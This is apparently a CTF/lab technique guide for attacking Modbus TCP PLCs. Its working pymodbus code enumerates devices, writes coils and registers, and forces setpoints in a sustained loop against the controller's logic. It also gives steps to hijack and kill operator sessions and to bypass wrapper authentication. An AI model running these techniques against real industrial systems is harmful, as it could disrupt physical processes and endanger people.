# Modbus TCP — Read/Write Coils and Registers

## When this applies

- Target speaks Modbus TCP (default port 502, often non-standard in CTFs/labs).
- Goal is to enumerate slave devices, read/write coils and registers, and (when applicable) extract data such as flags or process variables stored in registers.

## Technique

Modbus TCP has no authentication — any client can send Function Code (FC) requests if reachable. Slave/Unit IDs (1 byte, 0x00–0xFF) address devices behind a gateway. Standard FCs are well-defined; vendor extensions wrap proprietary session protocols inside custom FC numbers.

## Steps

### 1. Slave / Unit ID discovery

Brute-force all 256 slave IDs to find connected PLCs:

```python
# Brute-force with FC 0x2B (read device identification)
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient(HOST, port=PORT)
for sid in range(256):
    resp = client.read_device_identification(slave=sid)
    # Non-error response = active PLC. Inspect ProductName, VendorName fields
```

Or use nmap NSE:

```bash
nmap -p 502 --script modbus-discover --script-args='modbus-discover.aggressive=true' TARGET
```

### 2. Function Code enumeration

Try each standard FC against a discovered slave to map capabilities:

```python
for fc in [1, 2, 3, 4, 5, 6, 15, 16, 0x2B]:
    # Non-error response = supported FC on this slave
```

Standard FCs:
- **FC01** Read Coils
- **FC02** Read Discrete Inputs
- **FC03** Read Holding Registers
- **FC04** Read Input Registers
- **FC05** Write Single Coil
- **FC06** Write Single Register
- **FC15** Write Multiple Coils
- **FC16** Write Multiple Registers
- **FC43 / 0x2B** Read Device Identification

### 3. Coil and register mapping

```python
from pymodbus.client import ModbusTcpClient
client = ModbusTcpClient(HOST, port=502)
client.connect()

# Read 1000 coils in batches of 100
for offset in range(0, 1000, 100):
    rr = client.read_coils(offset, 100, slave=SLAVE_ID)
    if rr.isError():
        continue
    for i, bit in enumerate(rr.bits):
        if bit:
            print(f"coil[{offset+i}] = 1")

# Read 500 holding registers
for offset in range(0, 500, 100):
    rr = client.read_holding_registers(offset, 100, slave=SLAVE_ID)
    print(offset, rr.registers)
```

### 4. ASCII flag extraction

Holding registers often store strings as ASCII (one char per register or two chars per register, big-endian):

```python
# One char per register
chars = ''.join(chr(r) for r in registers if 32 <= r < 127)
print(chars)

# Two chars per register (big-endian)
import struct
data = b''.join(struct.pack('>H', r) for r in registers)
print(data.decode('ascii', errors='replace'))
```

### 5. Writing coils and registers

```python
# Single coil
client.write_coil(address=10, value=True, slave=SLAVE_ID)

# Single register
client.write_register(address=20, value=0x1234, slave=SLAVE_ID)

# Multiple coils
client.write_coils(address=0, values=[True]*8, slave=SLAVE_ID)

# Multiple registers
client.write_registers(address=0, values=[0x1, 0x2, 0x3], slave=SLAVE_ID)
```

### 6. Sustained-write override (PLC logic competing)

PLC ladder logic typically runs in scan cycles (~1s) and may continuously reset coils/registers. If single-shot writes are reverted, run a sustained write loop:

```python
import time
while True:
    client.write_coil(MANUAL_MODE_COIL, True, slave=SLAVE_ID)
    client.write_register(SETPOINT_REG, 9999, slave=SLAVE_ID)
    time.sleep(0.2)   # 5 Hz beats 1 Hz PLC scan
```

This is the standard technique for forcing a PLC into a state the controller fights against.

### 7. Custom Function Codes (vendor extensions)

Some vendors wrap proprietary session protocols inside custom FCs (e.g., FC 0x66):

- **Structure**: `[Session_ID][Sub-FC/Command][Data...]`
- **Sub-FC enumeration**: try all 256 sub-FC values to map available commands
- **Session management**: sessions are typically 1-byte tokens — brute-force 0x00–0xFF
- **Common sub-FC patterns**: reserve/release (session lifecycle), start/stop PLC logic, enable/disable write access, read status/device info

```python
from pymodbus.client import ModbusTcpClient
from pymodbus.pdu import ModbusRequest, ModbusResponse
from pymodbus.transaction import ModbusSocketFramer
import struct

class CustomRequest(ModbusRequest):
    function_code = 0x66    # replace with target FC
    def __init__(self, data=None, **kwargs):
        super().__init__(**kwargs)
        self.data = data or []
    def encode(self):
        return struct.pack('B' * len(self.data), *self.data)
    def decode(self, data): pass

class CustomResponse(ModbusResponse):
    function_code = 0x66
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.data = []
    def encode(self): pass
    def decode(self, data):
        self.data = struct.unpack('>' + 'B' * len(data), data)

client = ModbusTcpClient(HOST, port=PORT, framer=ModbusSocketFramer)
client.framer.decoder.register(CustomResponse)
```

### 8. Session hijacking (attack pattern)

When the device implements per-session reservations:

1. Brute-force session token (0x00–0xFF) using a command that succeeds on valid sessions.
2. Release/kill the existing operator session to stop their program.
3. Take a new reservation under your own operator name.
4. Enable write access (may require multiple enable commands).
5. Proceed with coil/register writes.

### 9. PCAP analysis

When traffic captures are provided:

1. Filter on Modbus TCP (port 502 or custom).
2. Map session flow: reserve → auth → commands → release.
3. Extract session tokens, operator names, sub-FC sequences.
4. Identify coil/register addresses from read/write operations.
5. Replay or adapt the observed sequence with modifications.

## Verifying success

- Target's ProductName / VendorName logged from FC 0x2B response.
- Coil/register values successfully written and persist (or persist while sustained-write loop runs).
- ASCII payload extracted from registers matches expected format (e.g., flag pattern).
- Process variable changes observable on the operator HMI (if accessible).

## Common pitfalls

- **No authentication** — but no encryption either. Network position alone determines access.
- **Slave ID required** — Modbus over TCP still uses the unit ID byte. Default 0 or 1 doesn't always work.
- **Function-code-not-supported errors** look like real responses — check the `function_code` byte: high bit set (0x80+) indicates an exception response.
- **Address ranges differ between devices** — coils 0–9999, discrete inputs 10000–19999, input registers 30000–39999, holding registers 40000–49999 (Modbus reference numbering). pymodbus uses 0-based addressing internally; subtract the base when porting from documentation.
- **Single-shot writes fail** when ladder logic continuously overrides — use sustained loops or stop the PLC program first.
- **Modbus over Serial / RS-485 gateways** behave slightly differently — same protocol, different addressing rules.
- **Some "Modbus" deployments** wrap a fake authentication layer in a wrapper protocol — bypass by speaking raw Modbus directly to the underlying port.

## Tools

- pymodbus (Python — primary)
- modbus-cli, mbtget (CLI clients)
- nmap NSE: `modbus-discover`
- Metasploit `auxiliary/scanner/scada/modbusclient`
- ModBus Constructor / qModMaster (GUI clients)
